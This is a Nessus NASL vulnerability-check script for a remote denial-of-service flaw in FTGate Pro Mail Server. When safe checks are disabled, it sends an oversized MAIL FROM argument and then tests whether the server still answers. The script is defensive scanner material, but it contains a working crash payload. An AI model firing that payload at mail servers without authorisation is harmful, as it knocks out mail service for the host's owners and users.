#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Ref:
# From: "Dennis Rand" <der@infowarfare.dk>
# To: "Vulnwatch@Vulnwatch. Org" <vulnwatch@vulnwatch.org>,
# Date: Tue, 6 May 2003 14:57:25 +0200
# Subject: [VulnWatch] Multiple Buffer Overflow Vulnerabilities Found in FTGate Pro Mail Server v. 1.22 (1328)

if(description)
{
 script_id(11579);
 script_version ("$Revision: 1.4 $");


 name["english"] = "FTgate DoS";
 script_name(english:name["english"]);

 desc["english"] = "
The remote SMTP server is running FT Gate Pro.

There is a flaw in this version which may allow an attacker
to disable this SMTP server remotely, by supplying a too long
argument to the MAIL FROM and RCPT TO  SMTP commands.

An attacker may use this flaw to prevent this host from processing
the mail it should process.

Solution : Upgrade to FTgate Pro Mail Server v. 1.22 Hotfix 1330
Risk factor : High";




 script_description(english:desc["english"]);

 summary["english"] = "Checks for FTgate";

 script_summary(english:summary["english"]);

 script_category(ACT_MIXED_ATTACK);


 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;

banner = get_smtp_banner(port:port);

if(banner)
{
  if("FTGatePro" >< banner)
  {
   if(safe_checks())
   {
    report = "
 The remote SMTP server is running FT Gate Pro.

There is a flaw in this version which may allow an attacker
to disable this SMTP server remotely, by supplying a too long
argument to the MAIL FROM and RCPT TO  SMTP commands.

An attacker may use this flaw to prevent this host from processing
the mail it should process.

*** Since safe checks are enabled, Nessus could not verify this
*** flaw nor the version of the remote FTGatePro server, so this
*** might be a false positive

Solution : Upgrade to FTgate Pro Mail Server v. 1.22 Hotfix 1330
Risk factor : High";

    security_hole(port:port, data:report);
    exit(0);
   }

   soc = open_sock_tcp(port);
   if(!soc)exit(0);

   r = smtp_recv_banner(socket:soc);

   send(socket:soc, data:string("HELO there\r\n"));
   r = recv_line(socket:soc, length:4096);

   send(socket:soc, data:string("MAIL FROM: ", crap(2400), "@", crap(2400),".com\r\n\r\n"));
   r = recv_line(socket:soc, length:4096, timeout:1);
   close(soc);

   soc = open_sock_tcp(port);
   if(!soc){ security_hole(port); exit(0); }

   r = smtp_recv_banner(socket:soc);
   if(!r)security_hole(port);

   close(soc);
  }
}

